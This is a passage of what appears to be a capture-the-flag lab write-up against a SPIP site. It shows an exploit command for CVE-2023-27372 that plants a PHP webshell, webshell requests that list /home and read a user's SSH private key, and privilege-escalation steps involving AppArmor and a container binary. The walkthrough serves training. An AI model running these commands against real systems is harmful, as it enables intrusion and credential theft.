...
```
![image](https://github.com/user-attachments/assets/1cfb1ad9-a181-4f08-be0e-431c56ab2e4c)

### Let check it.
![Screenshot 2024-09-10 060112](https://github.com/user-attachments/assets/c7cbbe45-9efe-4ab3-b97c-8302ea808537)

### Let upload a webshell,
```
python3 CVE-2023-27372.py -u http://10.10.191.151/spip -c 'echo "<?php system(\$_GET[\"cmd\"]); ?>" > webshell.php'  -v
```
![image](https://github.com/user-attachments/assets/c266727c-fd85-444c-b0a0-3ea578fb479e)

### Let access it.
![image](https://github.com/user-attachments/assets/09b371cc-b7e1-4699-9907-c05738f8be3c)
...
?cmd=ls -at /home
```
![image](https://github.com/user-attachments/assets/b4ce3867-2aa7-4a49-bc59-d5e80af8b0f8)

### There is only 1 user think , Let try to access his directories.

![image](https://github.com/user-attachments/assets/795776af-0ff7-4333-8d77-fc0a804f916d)

### There is .ssh present let try can we get the pub key.

![image](https://github.com/user-attachments/assets/b41d4af2-e526-4052-99e0-fe77230226f2)

### Here is the key, Let read it,
```
?cmd=cat /home/think/.ssh/id_rsa
```
![image](https://github.com/user-attachments/assets/39055819-2957-49bf-a91a-50db90320508)
...
```
![image](https://github.com/user-attachments/assets/06252984-3e5f-42ed-b728-78c37c7a81f4)
...
/usr/sbin/run_container
```
![image](https://github.com/user-attachments/assets/9e28f8c9-8bd2-460f-bf4a-398ce07f7b37)
...
![image](https://github.com/user-attachments/assets/30de2617-650c-475c-b48c-de7644539c47)

### Let taka a look at App Armor  so we can find profile of this shell.

![image](https://github.com/user-attachments/assets/1010631e-e5f3-4ffb-bf9f-eac65debbc80)
...
./test -p
```
![image](https://github.com/user-attachments/assets/386548a0-39ae-4c1e-8808-17e16cdcf1ac)
